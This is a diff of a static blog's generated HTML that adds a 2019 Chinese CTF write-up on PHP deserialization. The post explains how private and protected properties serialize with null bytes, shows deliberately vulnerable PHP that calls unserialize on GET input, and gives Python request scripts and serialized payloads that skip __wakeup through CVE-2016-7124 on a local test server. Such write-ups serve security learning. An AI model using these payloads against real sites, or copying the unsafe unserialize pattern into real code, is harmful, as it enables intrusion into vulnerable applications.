@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>K4ge&#39;s Blog</title>
+    <title>PHP反序列化绕过__wakeup方法 · K4ge&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >K4ge&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">PHP反序列化绕过__wakeup方法</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>K4ge's Blog</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            PHP反序列化绕过__wakeup方法
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">656</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/04/21</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,42 +399,69 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/02/03/同一台电脑连接多个github仓库/" >
-            
-                <span>同一台电脑连接多个github仓库</span>
-        </a>
-        <div class="abstract-content">
-            0x01.生成密钥1ssh-keygen -t rsa -C &quot;yourname@email.com&quot;
-分别生成两次公钥，可以得到两组公钥和私钥
-0x02. 在github上添加公钥不解释
-0x03. 添加config配置文件在.ssh文件夹下添加config文件1234567891011#第一个账号 Bu1uokageHost github.comHostName github.comUser gitIdentityFile ~/.ssh/id_rsa#第二个账号 K4geHost K4geHostName github.comUser gitIdentityFil...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/02/03</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "other">other</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01.前言"></a>0x01.前言</h2><p>做国赛ctf，遇到一个绕过点感觉挺有价值的，主要是通过CVE-2016-7124进行绕过。<br>影响版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p>
+<h2 id="0x02-public-private-protected的序列化"><a href="#0x02-public-private-protected的序列化" class="headerlink" title="0x02. public private protected的序列化"></a>0x02. public private protected的序列化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Kage&#123;</span><br><span class="line">	public $name=&apos;kxj&apos;;</span><br><span class="line">	private $name2=&apos;kxj&apos;;</span><br><span class="line">	protected $name3=&apos;kxj&apos;;</span><br><span class="line"></span><br><span class="line">	public function getName()&#123;</span><br><span class="line">		var_dump($this);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new Kage());</span><br><span class="line"></span><br><span class="line">$a = unserialize($_GET[&apos;id&apos;]);</span><br><span class="line">$a-&gt;getName();</span><br></pre></td></tr></table></figure>
+<p>运行得到结果：<br><code>O:4:&quot;Kage&quot;:3:{s:5:&quot;name1&quot;;s:3:&quot;kxj&quot;;s:11:&quot;Kagename2&quot;;s:3:&quot;kxj&quot;;s:8:&quot;*name3&quot;;s:3:&quot;kxj&quot;;}</code><br>属性值都一样，不同的在属性名</p>
+<ul>
+<li>public：s:5:”name1”</li>
+<li>private：s:11:”Kagename2”</li>
+<li>protected：s:8:”*name3”</li>
+</ul>
+<p>细心观察，会发现private和protected方法长度与所标识的不一样，实际原因是因为浏览器或命令行无法输出某些字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/ctf/guosai/test/test.php&quot;</span><br><span class="line"></span><br><span class="line">h = requests.get(url).content</span><br><span class="line"></span><br><span class="line">print(h)</span><br></pre></td></tr></table></figure></p>
+<p>通过content输出可以发现<br><code>b&#39;O:4:&quot;Kage&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;kxj&quot;;s:11:&quot;\x00Kage\x00name2&quot;;s:3:&quot;kxj&quot;;s:8:&quot;\x00*\x00name3&quot;;s:3:&quot;kxj&quot;;}&#39;</code></p>
+<ul>
+<li>public：s:5:”name1”</li>
+<li>private：s:11:”\x00Kage\x00name2”</li>
+<li>protected：s:8:”\x00*\x00name3”</li>
+</ul>
+<p>研究可以发现，<code>public</code>修饰变量时原样保留，<code>private</code>修饰变量时为<code>\x00类名\x00变量名</code>，<code>protected</code>修饰变量时为<code>\x00*\x00变量</code>。</p>
+<p>写脚本用<code>\x00</code>时会报错，可以使用<code>%00</code>或者<code>\0</code>来填充<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">p1 = &apos;O:4:&quot;Kage&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;flag&quot;;s:11:&quot;%00Kage%00name2&quot;;s:4:&quot;flag&quot;;s:8:&quot;%00*%00name3&quot;;s:4:&quot;flag&quot;;&#125;&apos;</span><br><span class="line">p2 = &apos;O:4:&quot;Kage&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;flag&quot;;s:11:&quot;\0Kage\0name2&quot;;s:4:&quot;flag&quot;;s:8:&quot;\0*\0name3&quot;;s:4:&quot;flag&quot;;&#125;&apos;</span><br><span class="line">url = &quot;http://127.0.0.1/ctf/guosai/test/test.php?id=&quot; + p2</span><br><span class="line"></span><br><span class="line">h = requests.get(url).content</span><br><span class="line"></span><br><span class="line">print(h)</span><br></pre></td></tr></table></figure></p>
+<p>结果将<code>kxj</code>改为了<code>flag</code><br><img src="/img/1555855975423.png" alt="Alt text"></p>
+<h2 id="0x03-wakeup魔术方法绕过"><a href="#0x03-wakeup魔术方法绕过" class="headerlink" title="0x03. __wakeup魔术方法绕过"></a>0x03. __wakeup魔术方法绕过</h2><p>CVE-2016-7124：简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Test&#123;</span><br><span class="line">	private $file;</span><br><span class="line">	</span><br><span class="line">	public function __construct($file) &#123;</span><br><span class="line">		$this-&gt;file = $file;</span><br><span class="line">	&#125;</span><br><span class="line">	public function __destruct() &#123;</span><br><span class="line">		echo $this-&gt;file;</span><br><span class="line">	&#125;</span><br><span class="line">	public function __wakeup() &#123;</span><br><span class="line">		$this-&gt;file = NULL;</span><br><span class="line">		echo &quot;wakeup&lt;br/&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">// $s = new Test(&apos;index&apos;);</span><br><span class="line">// $g = serialize($s);</span><br><span class="line">// echo $g;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[&apos;id&apos;]);</span><br></pre></td></tr></table></figure></p>
+<p>意思大概就是反序列化之后，会自动调用<code>__wakeup</code>方法将文件名设置为空。<br><code>O:4:&quot;Test&quot;:1:{s:10:&quot;%00Test%00file&quot;;s:4:&quot;flag&quot;;}</code><br><img src="/img/1555860027596.png" alt="Alt text"></p>
+<p>将对象属性设置为2<br><code>O:4:&quot;Test&quot;:2:{s:10:&quot;%00Test%00file&quot;;s:4:&quot;flag&quot;;}</code><br><img src="/img/1555860082394.png" alt="Alt text"><br>成功控制file变量输出flag。</p>
+
     </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">Kage</a>
+            <p>原文链接：<a href="http://yoursite.com/2019/04/21/PHP反序列化绕过__wakeup方法/">http://yoursite.com/2019/04/21/PHP反序列化绕过__wakeup方法/</a>
+            <p>发表日期：<a href="http://yoursite.com/2019/04/21/PHP反序列化绕过__wakeup方法/">四月 21日 2019, 11:24:35 晚上</a>
+            <p>更新日期：<a href="http://yoursite.com/2019/04/21/PHP反序列化绕过__wakeup方法/">April 21st 2019, 11:26:18 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/04/19/DDCTF-2019-web-部分wp/" title= "DDCTF-2019-WEB-部分wp">
+                    <div class="prevTitle">DDCTF-2019-WEB-部分wp</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -455,6 +543,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-前言"><span class="toc-number">1.</span> <span class="toc-text">0x01.前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-public-private-protected的序列化"><span class="toc-number">2.</span> <span class="toc-text">0x02. public private protected的序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-wakeup魔术方法绕过"><span class="toc-number">3.</span> <span class="toc-text">0x03. __wakeup魔术方法绕过</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -658,6 +764,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
